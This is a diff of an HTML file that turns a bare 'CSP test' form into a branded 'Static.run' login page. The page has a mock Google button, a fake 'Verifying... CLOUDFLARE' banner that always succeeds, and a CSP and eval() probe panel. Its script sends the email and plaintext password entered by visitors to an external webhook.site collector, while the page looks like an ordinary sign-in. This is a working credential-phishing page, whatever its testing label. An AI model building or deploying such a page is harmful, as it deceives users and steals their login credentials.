@@ -1,15 +1,616 @@
-<!doctype html>
-<html>
-  <body>
-    <h2>StaticRun CSP Test</h2>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+  <title>Static.run · Secure Login & CSP Logic</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
 
-    <form
-      action="https://webhook.site/1e9493db-8cf0-4042-9dac-8cfc790db8b8"
-      method="POST"
-    >
-      <input type="email" name="email" />
-      <input type="password" name="password" />
-      <button type="submit">Submit</button>
+    body {
+      background: radial-gradient(circle at 10% 20%, #0b1120, #030712);
+      font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 1.5rem;
+    }
+
+    /* main dashboard layout */
+    .static-dashboard {
+      max-width: 1400px;
+      width: 100%;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 1.8rem;
+      align-items: stretch;
+    }
+
+    /* LOGIN CARD — exactly matching the described UI */
+    .login-card {
+      flex: 1.5;
+      min-width: 340px;
+      background: rgba(12, 18, 28, 0.85);
+      backdrop-filter: blur(18px);
+      border-radius: 2rem;
+      border: 1px solid rgba(56, 189, 248, 0.2);
+      box-shadow: 0 30px 40px -20px rgba(0, 0, 0, 0.6), 0 0 0 0.5px rgba(56, 189, 248, 0.15);
+      padding: 2rem 2rem 2.2rem;
+      transition: all 0.2s;
+    }
+
+    /* back to home */
+    .back-link {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      color: #7e9bc5;
+      font-size: 0.85rem;
+      font-weight: 500;
+      text-decoration: none;
+      margin-bottom: 1.8rem;
+      transition: 0.2s;
+      letter-spacing: -0.2px;
+    }
+    .back-link:hover {
+      color: #3b82f6;
+      gap: 10px;
+    }
+
+    .brand {
+      font-size: 2.2rem;
+      font-weight: 700;
+      background: linear-gradient(135deg, #ffffff, #7dd3fc);
+      background-clip: text;
+      -webkit-background-clip: text;
+      color: transparent;
+      margin-bottom: 0.3rem;
+      letter-spacing: -0.5px;
+    }
+
+    .welcome-text {
+      font-size: 1rem;
+      color: #92adcf;
+      margin-bottom: 1.8rem;
+      border-left: 3px solid #2dd4bf;
+      padding-left: 0.8rem;
+    }
+
+    /* google button */
+    .google-btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      width: 100%;
+      background: #111827;
+      border: 1px solid #2d3e60;
+      border-radius: 2rem;
+      padding: 0.75rem 0;
+      font-size: 0.9rem;
+      font-weight: 500;
+      color: #eef4ff;
+      cursor: pointer;
+      transition: 0.2s;
+      margin-bottom: 1.2rem;
+    }
+    .google-btn:hover {
+      background: #1e293b;
+      border-color: #3b82f6;
+      transform: translateY(-1px);
+    }
+
+    .separator {
+      display: flex;
+      align-items: center;
+      text-align: center;
+      color: #4a688b;
+      font-size: 0.75rem;
+      margin: 1rem 0 1.2rem;
+    }
+    .separator::before,
+    .separator::after {
+      content: '';
+      flex: 1;
+      border-bottom: 1px solid #24324f;
+    }
+    .separator span {
+      margin: 0 12px;
+    }
+
+    .input-group {
+      margin-bottom: 1.3rem;
+    }
+    .input-group label {
+      display: block;
+      font-size: 0.75rem;
+      font-weight: 500;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      color: #90b0da;
+      margin-bottom: 0.4rem;
+    }
+    .input-group input {
+      width: 100%;
+      background: #0b101c;
+      border: 1px solid #283450;
+      border-radius: 1.2rem;
+      padding: 0.8rem 1rem;
+      font-size: 0.9rem;
+      color: #f0f4fe;
+      transition: all 0.2s;
+    }
+    .input-group input:focus {
+      outline: none;
+      border-color: #38bdf8;
+      box-shadow: 0 0 0 3px rgba(56, 189, 248, 0.2);
+      background: #0f1626;
+    }
+
+    .row-flex {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin: 0.8rem 0 1.2rem;
+      flex-wrap: wrap;
+      gap: 10px;
+    }
+    .checkbox {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      color: #b9d0f0;
+      font-size: 0.8rem;
+    }
+    .checkbox input {
+      width: 16px;
+      height: 16px;
+      accent-color: #3b82f6;
+      margin: 0;
+    }
+    .forgot-link {
+      font-size: 0.8rem;
+      color: #74b9ff;
+      text-decoration: none;
+    }
+    .forgot-link:hover {
+      text-decoration: underline;
+    }
+
+    /* cloudflare verification area */
+    .cf-verify {
+      background: #0a1020;
+      border-radius: 1rem;
+      padding: 0.7rem 1rem;
+      margin: 1rem 0 1.2rem;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      font-size: 0.8rem;
+      border: 0.5px solid #2d4270;
+      font-family: monospace;
+    }
+    .cf-icon {
+      font-size: 1.2rem;
+    }
+    .verify-status {
+      color: #e2e8f0;
+      font-weight: 500;
+    }
+    .cf-spinner {
+      width: 16px;
+      height: 16px;
+      border: 2px solid #2d4270;
+      border-top: 2px solid #facc15;
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
+      display: inline-block;
+      margin-left: 8px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .login-btn {
+      width: 100%;
+      background: linear-gradient(95deg, #1e3a8a, #0f2e62);
+      border: none;
+      border-radius: 2rem;
+      padding: 0.85rem;
+      font-weight: 700;
+      font-size: 0.95rem;
+      color: white;
+      cursor: pointer;
+      transition: 0.2s;
+      margin-top: 0.5rem;
+      border: 1px solid #3b82f680;
+    }
+    .login-btn:hover {
+      background: linear-gradient(95deg, #2563eb, #1e40af);
+      transform: scale(0.98);
+      box-shadow: 0 6px 14px rgba(0, 100, 200, 0.3);
+    }
+
+    .signup-row {
+      text-align: center;
+      margin-top: 1.8rem;
+      font-size: 0.8rem;
+      color: #8195b0;
+    }
+    .signup-row a {
+      color: #7ab7ff;
+      font-weight: 600;
+      text-decoration: none;
+    }
+    .signup-row a:hover {
+      text-decoration: underline;
+    }
+
+    /* STATIC.RUN LOGIC PANEL (CSP + audit) */
+    .logic-panel {
+      flex: 1;
+      min-width: 320px;
+      background: #0a0f1cd9;
+      backdrop-filter: blur(12px);
+      border-radius: 1.8rem;
+      border: 1px solid #2a3b5a;
+      display: flex;
+      flex-direction: column;
+      box-shadow: 0 20px 30px -12px black;
+    }
+    .panel-header {
+      padding: 1rem 1.5rem;
+      border-bottom: 1px solid #1f2c44;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+    }
+    .panel-header h3 {
+      font-weight: 600;
+      font-size: 1rem;
+      background: linear-gradient(135deg, #b9e2ff, #38bdf8);
+      background-clip: text;
+      -webkit-background-clip: text;
+      color: transparent;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .badge-csp {
+      background: #1f2a44;
+      border-radius: 30px;
+      padding: 0.2rem 0.7rem;
+      font-size: 0.65rem;
+      font-family: monospace;
+      color: #9eb3da;
+    }
+    .log-area {
+      flex: 1;
+      padding: 1rem;
+      overflow-y: auto;
+      max-height: 460px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.75rem;
+      display: flex;
+      flex-direction: column;
+      gap: 0.55rem;
+    }
+    .log-entry {
+      background: #0f1424;
+      border-left: 3px solid #2dd4bf;
+      padding: 0.5rem 0.8rem;
+      border-radius: 12px;
+      color: #ccdeff;
+      word-break: break-word;
+    }
+    .log-entry.error {
+      border-left-color: #f97316;
+      background: #1e192f;
+    }
+    .log-entry.success {
+      border-left-color: #4ade80;
+      background: #0e2218;
+    }
+    .log-timestamp {
+      color: #5f86b9;
+      font-size: 0.65rem;
+      margin-right: 8px;
+    }
+    .toolbar {
+      display: flex;
+      gap: 12px;
+      margin-top: 12px;
+      padding: 0 1rem 1rem;
+    }
+    .small-btn {
+      background: #1e2b3f;
+      border: none;
+      color: #cbdff5;
+      border-radius: 30px;
+      padding: 0.4rem 1rem;
+      font-size: 0.7rem;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+    .small-btn:hover {
+      background: #2f4162;
+      color: white;
+    }
+
+    footer {
+      font-size: 0.65rem;
+      text-align: center;
+      margin-top: 1rem;
+      color: #415d83;
+    }
+    @media (max-width: 780px) {
+      .static-dashboard {
+        flex-direction: column;
+      }
+      .login-card, .logic-panel {
+        width: 100%;
+      }
+    }
+  </style>
+</head>
+<body>
+<div class="static-dashboard">
+  <!-- LEFT: EXACT LOGIN UI FROM DESCRIPTION -->
+  <div class="login-card">
+    <a href="#" class="back-link">← Back to Home</a>
+    <div class="brand">Static.run</div>
+    <div class="welcome-text">Welcome back! Log in to access your account and continue hosting your static website today.</div>
+
+    <!-- Google login mock -->
+    <button type="button" id="googleMockBtn" class="google-btn">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
+        <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+        <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
+        <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
+      </svg>
+      Google
+    </button>
+
+    <div class="separator"><span>Or log in with Email</span></div>
+
+    <form id="staticRunLoginForm" method="POST">
+      <div class="input-group">
+        <label>Email</label>
+        <input type="email" name="email" id="loginEmail" placeholder="hello@static.run" autocomplete="email" required>
+      </div>
+      <div class="input-group">
+        <label>Password</label>
+        <input type="password" name="password" id="loginPassword" placeholder="··········" autocomplete="current-password">
+      </div>
+
+      <div class="row-flex">
+        <label class="checkbox">
+          <input type="checkbox" id="rememberCheckbox"> Remember me
+        </label>
+        <a href="#" class="forgot-link" id="forgotPwLink">Forgot Password?</a>
+      </div>
+
+      <!-- Cloudflare verification area (as described) -->
+      <div class="cf-verify" id="cfVerifyBlock">
+        <span class="cf-icon">🛡️</span>
+        <span class="verify-status" id="verifyStatusText">Verifying... CLOUDFLARE</span>
+        <span class="cf-spinner" id="cfSpinner"></span>
+      </div>
+
+      <button type="submit" class="login-btn" id="loginBtnAction">Login</button>
     </form>
-  </body>
+
+    <div class="signup-row">
+      Don't have an account? <a href="#" id="signupLink">Sign Up for free</a>
+    </div>
+    <footer>Privacy · Help</footer>
+  </div>
+
+  <!-- RIGHT: STATIC.RUN LOGIC PANEL (CSP / eval / webhook logs) -->
+  <div class="logic-panel">
+    <div class="panel-header">
+      <h3>⚙️ STATIC.RUN LOGIC <span class="badge-csp">CSP-aware</span></h3>
+      <button id="clearLogBtn" class="small-btn" style="background:#232e44;">clear logs</button>
+    </div>
+    <div class="log-area" id="liveLogContainer">
+      <div class="log-entry">
+        <span class="log-timestamp">⏺ init</span> ▶ Logic engine active — intercept mode ON<br>
+        📡 Webhook target: https://webhook.site/1e9493db-8cf0-4042-9dac-8cfc790db8b8
+      </div>
+      <div class="log-entry">
+        <span class="log-timestamp">🧪</span> CSP violation monitor ready · eval probe available
+      </div>
+    </div>
+    <div class="toolbar">
+      <button id="testCspEvalBtn" class="small-btn">🧪 CSP Test: eval() probe</button>
+      <button id="clearFormLogicBtn" class="small-btn">✖️ Clear fields</button>
+    </div>
+  </div>
+</div>
+
+<script>
+  (function() {
+    // DOM elements
+    const loginForm = document.getElementById('staticRunLoginForm');
+    const emailField = document.getElementById('loginEmail');
+    const passwordField = document.getElementById('loginPassword');
+    const rememberCheck = document.getElementById('rememberCheckbox');
+    const googleBtn = document.getElementById('googleMockBtn');
+    const forgotLink = document.getElementById('forgotPwLink');
+    const signupLink = document.getElementById('signupLink');
+    const clearLogBtn = document.getElementById('clearLogBtn');
+    const clearFormLogicBtn = document.getElementById('clearFormLogicBtn');
+    const testEvalBtn = document.getElementById('testCspEvalBtn');
+    const logContainer = document.getElementById('liveLogContainer');
+    const cfVerifyBlock = document.getElementById('cfVerifyBlock');
+    const verifyStatusSpan = document.getElementById('verifyStatusText');
+    const cfSpinner = document.getElementById('cfSpinner');
+
+    const WEBHOOK_URL = 'https://webhook.site/1e9493db-8cf0-4042-9dac-8cfc790db8b8';
+
+    // Helper: add log message
+    function addLog(message, type = 'info') {
+      const logDiv = document.createElement('div');
+      logDiv.className = 'log-entry';
+      if (type === 'error') logDiv.classList.add('error');
+      if (type === 'success') logDiv.classList.add('success');
+      const timestamp = new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute:'2-digit', second:'2-digit' });
+      const timeSpan = document.createElement('span');
+      timeSpan.className = 'log-timestamp';
+      timeSpan.textContent = `[${timestamp}]`;
+      const msgSpan = document.createElement('span');
+      msgSpan.innerHTML = message;
+      logDiv.appendChild(timeSpan);
+      logDiv.appendChild(msgSpan);
+      logContainer.appendChild(logDiv);
+      logContainer.scrollTop = logContainer.scrollHeight;
+    }
+
+    function clearLogs() {
+      while(logContainer.firstChild) logContainer.removeChild(logContainer.firstChild);
+      addLog('🧹 Log panel cleared. StaticRun logic resumed.', 'info');
+      addLog(`🔗 Endpoint: ${WEBHOOK_URL}`, 'info');
+    }
+
+    // simulate cloudflare verification (exactly the "Verifying... CLOUDFLARE" then verified)
+    function simulateCloudflareVerification() {
+      verifyStatusSpan.innerHTML = 'Verifying... CLOUDFLARE';
+      if (cfSpinner) cfSpinner.style.display = 'inline-block';
+      setTimeout(() => {
+        verifyStatusSpan.innerHTML = '✓ Verified · Cloudflare';
+        if (cfSpinner) cfSpinner.style.display = 'none';
+        addLog('☁️ Cloudflare verification completed — secure request environment ready', 'success');
+      }, 1800);
+    }
+
+    // Form submission (static.run logic -> fetch to webhook)
+    async function submitStaticRunLogic(email, password, remember) {
+      const cleanEmail = email.trim();
+      if (!cleanEmail) {
+        addLog('❌ Login error: email is required', 'error');
+        return false;
+      }
+      const emailPattern = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
+      if (!emailPattern.test(cleanEmail)) {
+        addLog(`⚠️ Invalid email format: "${cleanEmail}"`, 'error');
+        return false;
+      }
+
+      addLog(`⏳ StaticRun login attempt — email: ${cleanEmail} | remember me: ${remember ? 'yes' : 'no'}`, 'info');
+      const bodyParams = new URLSearchParams();
+      bodyParams.append('email', cleanEmail);
+      bodyParams.append('password', password || '');
+      bodyParams.append('remember', remember ? 'true' : 'false');
+      
+      try {
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 7000);
+        const response = await fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: bodyParams,
+          signal: controller.signal
+        });
+        clearTimeout(timeoutId);
+        if (response.ok) {
+          addLog(`✅ Login POST success! HTTP ${response.status} — payload sent to webhook collector.`, 'success');
+          addLog(`📦 { email: ${cleanEmail}, password: [REDACTED], remember: ${remember} }`, 'success');
+          return true;
+        } else {
+          addLog(`⚠️ Server responded with ${response.status} (${response.statusText})`, 'error');
+          return false;
+        }
+      } catch (err) {
+        if (err.name === 'AbortError') addLog(`⌛ Timeout: collector unreachable`, 'error');
+        else addLog(`💥 Fetch error: ${err.message} (CORS/network)`, 'error');
+        return false;
+      }
+    }
+
+    // Form handler
+    const onFormSubmit = async (e) => {
+      e.preventDefault();
+      const email = emailField.value;
+      const password = passwordField.value;
+      const remember = rememberCheck.checked;
+      await submitStaticRunLogic(email, password, remember);
+    };
+
+    // Google mock
+    function mockGoogleAuth() {
+      addLog('🔵 Google OAuth mock triggered (static.run demo) — redirect would happen', 'info');
+      addLog('⚡ Static logic: google auth simulation, no actual token exchange', 'info');
+    }
+
+    // Forgot password & signup logs
+    function mockForgotPassword() {
+      addLog('🔐 "Forgot Password?" clicked — reset flow simulation (demo)', 'info');
+    }
+    function mockSignUp() {
+      addLog('✨ "Sign Up for free" — StaticRun registration panel would open', 'info');
+    }
+
+    // CSP eval test
+    function testCspEval() {
+      addLog(`🧪 Running CSP eval() probe — checking script-src policies...`, 'info');
+      try {
+        const testResult = eval('5 + 3');
+        if (testResult === 8) {
+          addLog(`✅ CSP eval() allowed — result: 8. No 'unsafe-eval' restriction.`, 'success');
+        } else {
+          addLog(`⚠️ eval() executed but unexpected value: ${testResult}`, 'info');
+        }
+      } catch (err) {
+        addLog(`🚨 CSP VIOLATION: eval() blocked! Error: ${err.message}. 'unsafe-eval' not allowed.`, 'error');
+      }
+      // Additional Function constructor test
+      try {
+        const fnTest = new Function('return 7*7');
+        const val = fnTest();
+        addLog(`🔍 new Function() test: ${val} — ${val===49 ? 'allowed' : 'restricted'}`, 'info');
+      } catch (err2) {
+        addLog(`🔒 new Function() blocked by CSP: ${err2.message}`, 'error');
+      }
+    }
+
+    // clear form fields
+    function clearFormFields() {
+      emailField.value = '';
+      passwordField.value = '';
+      rememberCheck.checked = false;
+      addLog('✏️ Login fields cleared (email/password/remember)', 'info');
+    }
+
+    // global CSP violation listener (real)
+    if (typeof document !== 'undefined') {
+      document.addEventListener('securitypolicyviolation', (e) => {
+        addLog(`🚨 [REAL CSP] ${e.violatedDirective} — blocked: ${e.blockedURI || 'inline'}`, 'error');
+      });
+    }
+
+    // event binding
+    loginForm.addEventListener('submit', onFormSubmit);
+    googleBtn.addEventListener('click', mockGoogleAuth);
+    forgotLink.addEventListener('click', (e) => { e.preventDefault(); mockForgotPassword(); });
+    signupLink.addEventListener('click', (e) => { e.preventDefault(); mockSignUp(); });
+    clearLogBtn.addEventListener('click', clearLogs);
+    clearFormLogicBtn.addEventListener('click', clearFormFields);
+    testEvalBtn.addEventListener('click', testCspEval);
+
+    // add extra log for "Remember me" message & cloudflare verification
+    addLog('🛡️ CSP‑ready login interface active. All submissions are intercepted and logged.', 'info');
+    addLog('✨ "Verifying... CLOUDFLARE" banner will complete after page load.', 'info');
+    
+    // run Cloudflare mock verification after short delay
+    setTimeout(() => {
+      simulateCloudflareVerification();
+    }, 400);
+  })();
+</script>
+</body>
 </html>
